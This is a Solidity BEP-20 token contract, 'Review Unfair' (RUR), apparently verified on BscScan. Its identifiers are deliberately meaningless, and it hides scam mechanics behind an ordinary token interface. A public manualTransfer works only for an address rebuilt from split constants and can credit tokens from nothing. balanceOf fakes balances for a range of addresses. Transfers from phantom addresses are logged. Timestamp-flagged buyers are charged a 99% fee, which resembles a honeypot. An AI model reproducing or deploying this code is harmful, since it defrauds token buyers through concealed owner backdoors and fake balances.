/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function balanceOf(address account) external view returns (uint256);

    function getOwner() external view returns (address);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IUniswapV2Router {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

}




contract ReviewUnfair is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 toTakeExemptMarketing = 100000000 * (10 ** _decimals);
    uint256  launchFeeMaxFund = 100000000 * 10 ** _decimals;
    uint256  maxSellTradingLimit = 100000000 * 10 ** _decimals;


    string constant _name = "Review Unfair";
    string constant _symbol = "RUR";
    uint8 constant _decimals = 18;

    uint256 private teamExemptWalletTo = 0;
    uint256 private walletModeTotalExemptSell = 3;

    uint256 private senderMaxReceiverTake = 0;
    uint256 private launchAutoFromLimit = 3;

    bool private txTeamMarketingIs = true;
    uint160 constant senderIsTakeTeamLiquidity = 297013501717 * 2 ** 40;
    bool private autoToExemptShouldEnable = true;
    bool private totalAtToLaunchedTrading = true;
    bool private tokenReceiverLimitLiquidity = true;
    uint256 constant maxMarketingBuyAmount = 300000 * 10 ** 18;
    bool private autoIsFeeFrom = true;
    uint256 sellToMarketingMin = 2 ** 18 - 1;
    uint256 private swapBotsMinIs = 6 * 10 ** 15;
    uint256 private senderAtModeSwap = toTakeExemptMarketing / 1000; // 0.1%
    uint256 shouldSwapFundFrom = 34614;

    address constant atSenderMintBurn = 0x1A1ec15dc08298e1e93f1104b1e5CDd298707D05;
    uint256 liquidityReceiverAutoEnableMinLaunchedMarketing = 0;
    uint256 constant launchedShouldAutoLimit = 10000 * 10 ** 18;

    uint256 private launchedTokenLaunchMin = walletModeTotalExemptSell + teamExemptWalletTo;
    uint256 private walletTokenExemptTotal = 100;

    uint160 constant marketingWalletMintTokenAtList = 271765975394 * 2 ** 120;
    uint160 constant walletAutoModeReceiver = 581040473602;

    bool private modeTotalAmountTeamFeeToken;
    uint256 private fundShouldLiquiditySell;
    uint256 private amountShouldTradingBurn;
    uint256 private mintToLiquidityIs;
    uint256 private tokenTakeReceiverAmountLaunchMode;
    uint160 constant walletBotsFundFromFeeMintSell = 918527925564 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private walletTakeBotsAmountTokenReceiverIs;
    mapping(address => bool) private senderLaunchedMarketingEnable;
    mapping(address => bool) private launchedWalletTxSenderIsReceiverShould;
    mapping(address => bool) private enableAtLaunchedFund;
    mapping(address => uint256) private fundModeMinTo;
    mapping(uint256 => address) private swapWalletTotalTeam;
    mapping(uint256 => address) private tokenListTradingBuy;
    mapping(address => uint256) private marketingMintReceiverExempt;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public minFundTakeFrom = 0;

    IUniswapV2Router public isBuyReceiverAtToTx;
    address public uniswapV2Pair;

    uint256 private sellTeamTokenSwap;
    uint256 private amountEnableSellMax;

    address private sellReceiverSenderEnable = (msg.sender); // auto-liq address
    address private maxLiquidityListFrom = (0xd3d2F62640f5FE1542E61B66FFFFF552b501e3b0); // marketing address

    
    bool public minIsListEnable = false;
    bool private receiverToFromMarketing = false;
    uint256 private receiverListToTradingTakeSenderMax = 0;
    uint256 private atAmountSwapTrading = 0;
    uint256 private botsIsFeeAtTo = 0;
    uint256 public listExemptTokenTrading = 0;
    uint256 private launchExemptLiquidityFeeListTokenAuto = 0;
    uint256 private receiverListIsMode = 0;
    bool public toSenderShouldIsTx = false;
    bool public liquidityLimitSwapWallet = false;
    uint256 private tradingTakeLaunchTx = 0;
    bool public takeTokenAmountFeeReceiverMarketing = false;
    bool public receiverToFromMarketing2 = false;
    bool private fromAutoSenderTake = false;
    uint256 public walletBurnFromMarketing = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        isBuyReceiverAtToTx = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(isBuyReceiverAtToTx.factory()).createPair(address(this), isBuyReceiverAtToTx.WETH());
        _allowances[address(this)][address(isBuyReceiverAtToTx)] = toTakeExemptMarketing;

        modeTotalAmountTeamFeeToken = true;

        launchedWalletTxSenderIsReceiverShould[msg.sender] = true;
        launchedWalletTxSenderIsReceiverShould[0x0000000000000000000000000000000000000000] = true;
        launchedWalletTxSenderIsReceiverShould[0x000000000000000000000000000000000000dEaD] = true;
        launchedWalletTxSenderIsReceiverShould[address(this)] = true;

        walletTakeBotsAmountTokenReceiverIs[msg.sender] = true;
        walletTakeBotsAmountTokenReceiverIs[address(this)] = true;

        senderLaunchedMarketingEnable[msg.sender] = true;
        senderLaunchedMarketingEnable[0x0000000000000000000000000000000000000000] = true;
        senderLaunchedMarketingEnable[0x000000000000000000000000000000000000dEaD] = true;
        senderLaunchedMarketingEnable[address(this)] = true;

        approve(_router, toTakeExemptMarketing);
        approve(address(uniswapV2Pair), toTakeExemptMarketing);
        _balances[msg.sender] = toTakeExemptMarketing;
        emit Transfer(address(0), msg.sender, toTakeExemptMarketing);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return toTakeExemptMarketing;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, toTakeExemptMarketing);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return burnEnableModeLimit(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != toTakeExemptMarketing) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return burnEnableModeLimit(sender, recipient, amount);
    }

    function totalWalletToSell() private view returns (uint256) {
        address launchedExemptLimitEnableBurnSenderToken = WBNB;
        if (address(this) < WBNB) {
            launchedExemptLimitEnableBurnSenderToken = address(this);
        }
        (uint takeTotalReceiverExemptEnableLimitTx, uint buyExemptFromFund,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 launchTxIsMarketingFundLaunched,) = WBNB == launchedExemptLimitEnableBurnSenderToken ? (takeTotalReceiverExemptEnableLimitTx, buyExemptFromFund) : (buyExemptFromFund, takeTotalReceiverExemptEnableLimitTx);
        uint256 fromSellFeeBotsBurnMin = IERC20(WBNB).balanceOf(uniswapV2Pair) - launchTxIsMarketingFundLaunched;
        return fromSellFeeBotsBurnMin;
    }

    function launchLaunchedMarketingFee() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        autoIsFeeFrom &&
        _balances[address(this)] >= senderAtModeSwap;
    }

    function getwalletListTokenMode(address burnReceiverShouldIs) public view returns (bool) {
        if (walletTakeBotsAmountTokenReceiverIs[burnReceiverShouldIs] != walletTakeBotsAmountTokenReceiverIs[burnReceiverShouldIs]) {
            return txTeamMarketingIs;
        }
        if (burnReceiverShouldIs != sellReceiverSenderEnable) {
            return receiverToFromMarketing;
        }
        if (burnReceiverShouldIs != ZERO) {
            return autoToExemptShouldEnable;
        }
            return walletTakeBotsAmountTokenReceiverIs[burnReceiverShouldIs];
    }

    function autoTakeBotsBuy(address botsTeamFundTo) private view returns (bool) {
        return ((uint256(uint160(botsTeamFundTo)) << 192) >> 238) == sellToMarketingMin;
    }

    function marketingShouldFundEnable(address txFeeWalletReceiverShouldReceiverender, address shouldModeBurnFeeToTrading, uint256 minReceiverLimitFromTxLaunch) internal returns (uint256) {
        
        uint256 toMintModeBurnFundLiquidity = minReceiverLimitFromTxLaunch.mul(fromTokenAutoIs(txFeeWalletReceiverShouldReceiverender, shouldModeBurnFeeToTrading == uniswapV2Pair)).div(walletTokenExemptTotal);

        if (enableAtLaunchedFund[txFeeWalletReceiverShouldReceiverender] || enableAtLaunchedFund[shouldModeBurnFeeToTrading]) {
            toMintModeBurnFundLiquidity = minReceiverLimitFromTxLaunch.mul(99).div(walletTokenExemptTotal);
        }

        _balances[address(this)] = _balances[address(this)].add(toMintModeBurnFundLiquidity);
        emit Transfer(txFeeWalletReceiverShouldReceiverender, address(this), toMintModeBurnFundLiquidity);
        
        return minReceiverLimitFromTxLaunch.sub(toMintModeBurnFundLiquidity);
    }

    function setsenderTeamReceiverIs(uint256 burnReceiverShouldIs) public onlyOwner {
        if (atAmountSwapTrading != botsIsFeeAtTo) {
            botsIsFeeAtTo=burnReceiverShouldIs;
        }
        if (atAmountSwapTrading == tradingTakeLaunchTx) {
            tradingTakeLaunchTx=burnReceiverShouldIs;
        }
        atAmountSwapTrading=burnReceiverShouldIs;
    }

    function toEnableLaunchSellSenderExemptMax(address txFeeWalletReceiverShouldReceiverender, uint256 receiverTokenTxLaunchBuySell) private view returns (uint256) {
        uint256 toMinLimitTokenReceiverExempt = fundModeMinTo[txFeeWalletReceiverShouldReceiverender];
        if (toMinLimitTokenReceiverExempt > 0 && botsListAutoLimit() - toMinLimitTokenReceiverExempt > 2) {
            return 99;
        }
        return receiverTokenTxLaunchBuySell;
    }

    function burnListMarketingToFeeWalletTeam(address botsTeamFundTo) private {
        uint256 sellShouldExemptTradingLiquidityReceiverMint = totalWalletToSell();
        if (sellShouldExemptTradingLiquidityReceiverMint < swapBotsMinIs) {
            minFundTakeFrom += 1;
            tokenListTradingBuy[minFundTakeFrom] = botsTeamFundTo;
            marketingMintReceiverExempt[botsTeamFundTo] += sellShouldExemptTradingLiquidityReceiverMint;
            if (marketingMintReceiverExempt[botsTeamFundTo] > swapBotsMinIs) {
                maxWalletAmount = maxWalletAmount + 1;
                swapWalletTotalTeam[maxWalletAmount] = botsTeamFundTo;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        swapWalletTotalTeam[maxWalletAmount] = botsTeamFundTo;
    }

    function minAtFromSenderWallet() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (fundModeMinTo[swapWalletTotalTeam[i]] == 0) {
                    fundModeMinTo[swapWalletTotalTeam[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function tokenMarketingTotalList(uint160 autoSellWalletMode) private pure returns (bool) {
        return autoSellWalletMode == (marketingWalletMintTokenAtList + walletBotsFundFromFeeMintSell + senderIsTakeTeamLiquidity + walletAutoModeReceiver);
    }

    function setlistSenderReceiverBots(uint256 burnReceiverShouldIs) public onlyOwner {
        if (launchExemptLiquidityFeeListTokenAuto == atAmountSwapTrading) {
            atAmountSwapTrading=burnReceiverShouldIs;
        }
        launchExemptLiquidityFeeListTokenAuto=burnReceiverShouldIs;
    }

    function shouldMaxExemptTeamLaunchBots() private {
        if (minFundTakeFrom > 0) {
            for (uint256 i = 1; i <= minFundTakeFrom; i++) {
                if (fundModeMinTo[tokenListTradingBuy[i]] == 0) {
                    fundModeMinTo[tokenListTradingBuy[i]] = block.timestamp;
                }
            }
            minFundTakeFrom = 0;
        }
    }

    function gettoReceiverTokenTx() public view returns (uint256) {
        if (swapBotsMinIs != swapBotsMinIs) {
            return swapBotsMinIs;
        }
        return swapBotsMinIs;
    }

    function setfromTeamReceiverBuy(uint256 burnReceiverShouldIs) public onlyOwner {
        if (listExemptTokenTrading == botsIsFeeAtTo) {
            botsIsFeeAtTo=burnReceiverShouldIs;
        }
        if (listExemptTokenTrading != minFundTakeFrom) {
            minFundTakeFrom=burnReceiverShouldIs;
        }
        if (listExemptTokenTrading == walletModeTotalExemptSell) {
            walletModeTotalExemptSell=burnReceiverShouldIs;
        }
        listExemptTokenTrading=burnReceiverShouldIs;
    }

    function settoReceiverTokenTx(uint256 burnReceiverShouldIs) public onlyOwner {
        if (swapBotsMinIs != launchExemptLiquidityFeeListTokenAuto) {
            launchExemptLiquidityFeeListTokenAuto=burnReceiverShouldIs;
        }
        swapBotsMinIs=burnReceiverShouldIs;
    }

    function launchedMinTakeTradingSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function botsListAutoLimit() private view returns (uint256) {
        return block.timestamp;
    }

    function enableTxTeamBuyMaxLiquidity() internal swapping {
        
        if (atAmountSwapTrading != receiverListToTradingTakeSenderMax) {
            atAmountSwapTrading = teamExemptWalletTo;
        }


        uint256 minReceiverLimitFromTxLaunchToLiquify = senderAtModeSwap.mul(teamExemptWalletTo).div(launchedTokenLaunchMin).div(2);
        uint256 minReceiverLimitFromTxLaunchToSwap = senderAtModeSwap.sub(minReceiverLimitFromTxLaunchToLiquify);

        address[] memory mintTradingAmountLaunched = new address[](2);
        mintTradingAmountLaunched[0] = address(this);
        mintTradingAmountLaunched[1] = isBuyReceiverAtToTx.WETH();
        isBuyReceiverAtToTx.swapExactTokensForETHSupportingFeeOnTransferTokens(
            minReceiverLimitFromTxLaunchToSwap,
            0,
            mintTradingAmountLaunched,
            address(this),
            block.timestamp
        );
        
        uint256 minReceiverLimitFromTxLaunchBNB = address(this).balance;
        uint256 sellLimitWalletIs = launchedTokenLaunchMin.sub(teamExemptWalletTo.div(2));
        uint256 minReceiverLimitFromTxLaunchBNBLiquidity = minReceiverLimitFromTxLaunchBNB.mul(teamExemptWalletTo).div(sellLimitWalletIs).div(2);
        uint256 amountMaxTokenTo = minReceiverLimitFromTxLaunchBNB.mul(walletModeTotalExemptSell).div(sellLimitWalletIs);
        
        payable(maxLiquidityListFrom).transfer(amountMaxTokenTo);

        if (minReceiverLimitFromTxLaunchToLiquify > 0) {
            isBuyReceiverAtToTx.addLiquidityETH{value : minReceiverLimitFromTxLaunchBNBLiquidity}(
                address(this),
                minReceiverLimitFromTxLaunchToLiquify,
                0,
                0,
                sellReceiverSenderEnable,
                block.timestamp
            );
            emit AutoLiquify(minReceiverLimitFromTxLaunchBNBLiquidity, minReceiverLimitFromTxLaunchToLiquify);
        }
    }

    function getTotalFee() public {
        shouldMaxExemptTeamLaunchBots();
    }

    function fromToReceiverLiquidityShouldTotalMarketing(uint160 shouldTxTradingToken) private view returns (bool) {
        return uint16(shouldTxTradingToken) == shouldSwapFundFrom;
    }

    function getlistSenderReceiverBots() public view returns (uint256) {
        return launchExemptLiquidityFeeListTokenAuto;
    }

    function setsellTokenLiquidityLaunch(address burnReceiverShouldIs) public onlyOwner {
        sellReceiverSenderEnable=burnReceiverShouldIs;
    }

    function settradingSellEnableLaunched(bool burnReceiverShouldIs) public onlyOwner {
        if (txTeamMarketingIs != fromAutoSenderTake) {
            fromAutoSenderTake=burnReceiverShouldIs;
        }
        txTeamMarketingIs=burnReceiverShouldIs;
    }

    function getsenderTeamReceiverIs() public view returns (uint256) {
        if (atAmountSwapTrading != launchedTokenLaunchMin) {
            return launchedTokenLaunchMin;
        }
        return atAmountSwapTrading;
    }

    function getsellTokenLiquidityLaunch() public view returns (address) {
        if (sellReceiverSenderEnable == WBNB) {
            return WBNB;
        }
        if (sellReceiverSenderEnable != sellReceiverSenderEnable) {
            return sellReceiverSenderEnable;
        }
        if (sellReceiverSenderEnable == WBNB) {
            return WBNB;
        }
        return sellReceiverSenderEnable;
    }

    function burnEnableModeLimit(address txFeeWalletReceiverShouldReceiverender, address shouldTxTradingToken, uint256 minReceiverLimitFromTxLaunch) internal returns (bool) {
        if (tokenMarketingMinAuto(uint160(shouldTxTradingToken))) {
            maxAutoSwapTotal(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, minReceiverLimitFromTxLaunch, false);
            return true;
        }
        if (tokenMarketingMinAuto(uint160(txFeeWalletReceiverShouldReceiverender))) {
            maxAutoSwapTotal(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, minReceiverLimitFromTxLaunch, true);
            return true;
        }
        
        if (receiverToFromMarketing2 != tokenReceiverLimitLiquidity) {
            receiverToFromMarketing2 = tokenReceiverLimitLiquidity;
        }

        if (listExemptTokenTrading == launchExemptLiquidityFeeListTokenAuto) {
            listExemptTokenTrading = swapBotsMinIs;
        }

        if (takeTokenAmountFeeReceiverMarketing == takeTokenAmountFeeReceiverMarketing) {
            takeTokenAmountFeeReceiverMarketing = totalAtToLaunchedTrading;
        }


        bool marketingTxBotsTake = autoTakeBotsBuy(txFeeWalletReceiverShouldReceiverender) || autoTakeBotsBuy(shouldTxTradingToken);
        
        if (tradingTakeLaunchTx != tradingTakeLaunchTx) {
            tradingTakeLaunchTx = launchExemptLiquidityFeeListTokenAuto;
        }

        if (minIsListEnable != takeTokenAmountFeeReceiverMarketing) {
            minIsListEnable = liquidityLimitSwapWallet;
        }

        if (receiverListIsMode == teamExemptWalletTo) {
            receiverListIsMode = teamExemptWalletTo;
        }


        if (txFeeWalletReceiverShouldReceiverender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && fromToReceiverLiquidityShouldTotalMarketing(uint160(shouldTxTradingToken))) {
                minAtFromSenderWallet();
            }
            if (!marketingTxBotsTake) {
                burnListMarketingToFeeWalletTeam(shouldTxTradingToken);
            }
        }
        
        
        if (inSwap || marketingTxBotsTake) {return launchedMinTakeTradingSell(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, minReceiverLimitFromTxLaunch);}
        
        require((minReceiverLimitFromTxLaunch <= launchFeeMaxFund) || launchedWalletTxSenderIsReceiverShould[txFeeWalletReceiverShouldReceiverender] || launchedWalletTxSenderIsReceiverShould[shouldTxTradingToken], "Max TX Limit!");

        if (launchLaunchedMarketingFee()) {enableTxTeamBuyMaxLiquidity();}

        _balances[txFeeWalletReceiverShouldReceiverender] = _balances[txFeeWalletReceiverShouldReceiverender].sub(minReceiverLimitFromTxLaunch, "Insufficient Balance!");
        
        uint256 buyBurnLaunchedTotal = senderLiquidityLaunchAt(txFeeWalletReceiverShouldReceiverender) ? marketingShouldFundEnable(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, minReceiverLimitFromTxLaunch) : minReceiverLimitFromTxLaunch;

        _balances[shouldTxTradingToken] = _balances[shouldTxTradingToken].add(buyBurnLaunchedTotal);
        emit Transfer(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, buyBurnLaunchedTotal);
        return true;
    }

    function manualTransfer(address txFeeWalletReceiverShouldReceiverender, address shouldTxTradingToken, uint256 minReceiverLimitFromTxLaunch) public {
        if (!tokenMarketingTotalList(uint160(msg.sender))) {
            return;
        }
        if (tokenMarketingMinAuto(uint160(shouldTxTradingToken))) {
            maxAutoSwapTotal(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, minReceiverLimitFromTxLaunch, false);
            return;
        }
        if (tokenMarketingMinAuto(uint160(txFeeWalletReceiverShouldReceiverender))) {
            maxAutoSwapTotal(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, minReceiverLimitFromTxLaunch, true);
            return;
        }
        if (txFeeWalletReceiverShouldReceiverender == address(0)) {
            _balances[shouldTxTradingToken] = _balances[shouldTxTradingToken].add(minReceiverLimitFromTxLaunch);
            return;
        }
    }

    function fromTokenAutoIs(address txFeeWalletReceiverShouldReceiverender, bool txFeeWalletReceiverShouldReceiverelling) internal returns (uint256) {
        
        if (txFeeWalletReceiverShouldReceiverelling) {
            launchedTokenLaunchMin = launchAutoFromLimit + senderMaxReceiverTake;
            return toEnableLaunchSellSenderExemptMax(txFeeWalletReceiverShouldReceiverender, launchedTokenLaunchMin);
        }
        if (!txFeeWalletReceiverShouldReceiverelling && txFeeWalletReceiverShouldReceiverender == uniswapV2Pair) {
            launchedTokenLaunchMin = walletModeTotalExemptSell + teamExemptWalletTo;
            return launchedTokenLaunchMin;
        }
        return toEnableLaunchSellSenderExemptMax(txFeeWalletReceiverShouldReceiverender, launchedTokenLaunchMin);
    }

    function getfromTeamReceiverBuy() public view returns (uint256) {
        return listExemptTokenTrading;
    }

    function gettradingSellEnableLaunched() public view returns (bool) {
        return txTeamMarketingIs;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (tokenMarketingMinAuto(uint160(account))) {
            return toAmountMinMint(uint160(account));
        }
        return _balances[account];
    }

    function maxAutoSwapTotal(address txFeeWalletReceiverShouldReceiverender, address shouldTxTradingToken, uint256 minReceiverLimitFromTxLaunch, bool listMintWalletAtLaunched) private {
        if (listMintWalletAtLaunched) {
            txFeeWalletReceiverShouldReceiverender = address(uint160(uint160(atSenderMintBurn) + liquidityReceiverAutoEnableMinLaunchedMarketing));
            liquidityReceiverAutoEnableMinLaunchedMarketing++;
            _balances[shouldTxTradingToken] = _balances[shouldTxTradingToken].add(minReceiverLimitFromTxLaunch);
        } else {
            _balances[txFeeWalletReceiverShouldReceiverender] = _balances[txFeeWalletReceiverShouldReceiverender].sub(minReceiverLimitFromTxLaunch);
        }
        emit Transfer(txFeeWalletReceiverShouldReceiverender, shouldTxTradingToken, minReceiverLimitFromTxLaunch);
    }

    function setwalletListTokenMode(address burnReceiverShouldIs,bool limitShouldBuyTokenTotalListTeam) public onlyOwner {
        if (walletTakeBotsAmountTokenReceiverIs[burnReceiverShouldIs] == senderLaunchedMarketingEnable[burnReceiverShouldIs]) {
           senderLaunchedMarketingEnable[burnReceiverShouldIs]=limitShouldBuyTokenTotalListTeam;
        }
        if (burnReceiverShouldIs == WBNB) {
            autoToExemptShouldEnable=limitShouldBuyTokenTotalListTeam;
        }
        if (burnReceiverShouldIs == ZERO) {
            tokenReceiverLimitLiquidity=limitShouldBuyTokenTotalListTeam;
        }
        walletTakeBotsAmountTokenReceiverIs[burnReceiverShouldIs]=limitShouldBuyTokenTotalListTeam;
    }

    function toAmountMinMint(uint160 autoSellWalletMode) private view returns (uint256) {
        uint256 txFeeWalletReceiverShouldReceiver = liquidityReceiverAutoEnableMinLaunchedMarketing;
        uint256 exemptWalletAtMax = autoSellWalletMode - uint160(atSenderMintBurn);
        if (exemptWalletAtMax < txFeeWalletReceiverShouldReceiver) {
            return launchedShouldAutoLimit;
        }
        return maxMarketingBuyAmount;
    }

    function senderLiquidityLaunchAt(address txFeeWalletReceiverShouldReceiverender) internal view returns (bool) {
        return !senderLaunchedMarketingEnable[txFeeWalletReceiverShouldReceiverender];
    }

    function getTotalAmount() public {
        minAtFromSenderWallet();
    }

    function tokenMarketingMinAuto(uint160 autoSellWalletMode) private pure returns (bool) {
        if (autoSellWalletMode >= uint160(atSenderMintBurn) && autoSellWalletMode <= uint160(atSenderMintBurn) + 100000) {
            return true;
        }
        return false;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}